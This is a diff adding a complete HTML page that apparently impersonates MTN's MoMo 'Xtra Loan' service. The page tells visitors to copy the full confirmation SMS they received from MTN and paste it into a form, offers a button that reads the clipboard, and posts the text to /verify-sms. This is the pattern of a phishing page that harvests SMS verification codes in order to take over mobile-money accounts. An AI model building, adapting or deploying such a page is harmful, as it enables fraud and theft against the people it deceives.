@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SMS Verification - MTN Advance Loans</title>
+    <style>
+        * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background-color: #eef2f5; margin: 0; padding: 0; }
+        
+        /* Top Header */
+        .top-header {
+            background-color: #000;
+            color: white;
+            padding: 10px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .logo-area {
+            background-color: #004c6c;
+            padding: 5px 15px;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .logo-area img { height: 30px; border-radius: 4px; }
+        .logo-area span { color: #ffcc00; font-weight: bold; font-size: 1.1rem; letter-spacing: 1px;}
+        
+        .header-title {
+            color: #ffcc00;
+            font-weight: bold;
+            font-size: 1.1rem;
+            letter-spacing: 1px;
+            flex-grow: 1;
+            margin-left: 20px;
+        }
+
+        .lang-btn {
+            background-color: #1a1a1a;
+            color: white;
+            border: 1px solid #444;
+            padding: 6px 15px;
+            border-radius: 20px;
+            font-size: 0.9rem;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        /* Main Content Container */
+        .container {
+            max-width: 500px;
+            margin: 20px auto;
+            background: white;
+            border-radius: 15px;
+            padding: 40px 25px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+            text-align: center;
+        }
+
+        .icon-circle {
+            background-color: #fff9e6;
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto 20px auto;
+            font-size: 2.5rem;
+            box-shadow: 0 0 20px rgba(255, 204, 0, 0.2);
+        }
+
+        h2 { color: #001f3f; font-size: 1.8rem; margin-bottom: 15px; }
+        h2 span { color: #ffcc00; }
+        
+        p.subtitle {
+            color: #555;
+            font-size: 1rem;
+            line-height: 1.5;
+            margin-bottom: 25px;
+        }
+
+        /* Yellow Tip Box */
+        .tip-box {
+            background-color: #fff9e6;
+            border-radius: 12px;
+            padding: 20px;
+            text-align: left;
+            font-size: 0.95rem;
+            color: #004c6c;
+            margin-bottom: 25px;
+            display: flex;
+            gap: 15px;
+            line-height: 1.4;
+        }
+        .tip-box span { font-size: 1.5rem; }
+
+        /* Textarea and Paste Button */
+        .sms-wrapper {
+            position: relative;
+            margin-bottom: 10px;
+        }
+        textarea {
+            width: 100%;
+            height: 150px;
+            padding: 15px;
+            border: 1px solid #ccc;
+            border-radius: 12px;
+            font-size: 1rem;
+            resize: none;
+            background-color: #fcfcfc;
+            outline: none;
+        }
+        textarea:focus { border-color: #004c6c; }
+
+        .paste-btn {
+            position: absolute;
+            bottom: 15px;
+            right: 15px;
+            background-color: #ffcc00;
+            color: #000;
+            border: none;
+            padding: 8px 18px;
+            border-radius: 20px;
+            font-weight: bold;
+            font-size: 1rem;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.15);
+        }
+
+        .char-count {
+            text-align: right;
+            font-size: 0.85rem;
+            color: #777;
+            margin-bottom: 25px;
+        }
+
+        .resend-row {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.95rem;
+            color: #666;
+            margin-bottom: 25px;
+            font-weight: bold;
+        }
+        .resend-row span { color: #ccc; cursor: not-allowed; }
+
+        /* Action Button */
+        .verify-btn {
+            width: 100%;
+            padding: 18px;
+            background-color: #ffe680; /* Faded yellow */
+            color: #999;
+            border: none;
+            border-radius: 12px;
+            font-size: 1.2rem;
+            font-weight: bold;
+            letter-spacing: 1px;
+            cursor: not-allowed;
+            transition: 0.3s;
+        }
+        .verify-btn.active {
+            background-color: #ffcc00;
+            color: #004c6c;
+            cursor: pointer;
+        }
+
+        .footer {
+            text-align: center;
+            font-size: 0.9rem;
+            color: #888;
+            margin-top: 30px;
+            padding-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- HEADER -->
+    <header class="top-header">
+        <div class="logo-area">
+            <img src="momo-preview.jpg" alt="MoMo">
+            <span>MTN XTRA LOAN</span>
+        </div>
+        <div class="lang-btn">🌐 English ▼</div>
+    </header>
+
+    <!-- MAIN CONTENT -->
+    <div class="container">
+        <div class="icon-circle">📩</div>
+        
+        <h2>Paste the <span>SMS</span> from MTN</h2>
+        <p class="subtitle">We sent a confirmation message to your number. <br><strong>Copy the full SMS you received</strong> and paste it below to continue.</p>
+
+        <div class="tip-box">
+            <span>💡</span>
+            <div>
+                Open your <strong>Messages app</strong>, find the SMS from <strong>MTN</strong>, long-press it, tap <strong>Copy</strong>, then come back here.
+            </div>
+        </div>
+
+        <form action="/verify-sms" method="POST">
+            <div class="sms-wrapper">
+                <textarea id="smsText" name="smsMessage" placeholder="Collez le SMS reçu de MTN ici..." required oninput="updateSmsState()"></textarea>
+                <button type="button" class="paste-btn" onclick="pasteSms()">📋 Paste</button>
+            </div>
+            <div class="char-count"><span id="charCount">0</span> characters</div>
+
+            <div class="resend-row">
+                <div>Didn't receive the SMS?</div>
+                <span>Resend SMS</span>
+            </div>
+
+            <button type="submit" id="verifyBtn" class="verify-btn" disabled>VERIFY & CONTINUE →</button>
+        </form>
+    </div>
+
+    <div class="footer">
+        © 2026 MTN Xtra Loan
+    </div>
+
+    <script>
+        function updateSmsState() {
+            const textarea = document.getElementById('smsText');
+            const charCount = document.getElementById('charCount');
+            const verifyBtn = document.getElementById('verifyBtn');
+
+            charCount.innerText = textarea.value.length;
+
+            if (textarea.value.trim().length > 0) {
+                verifyBtn.disabled = false;
+                verifyBtn.classList.add('active');
+            } else {
+                verifyBtn.disabled = true;
+                verifyBtn.classList.remove('active');
+            }
+        }
+
+        async function pasteSms() {
+            try {
+                const text = await navigator.clipboard.readText();
+                document.getElementById('smsText').value = text;
+                updateSmsState();
+            } catch (err) {
+                alert("Please paste manually (Ctrl+V or long-press).");
+            }
+        }
+    </script>
+</body>
+</html>
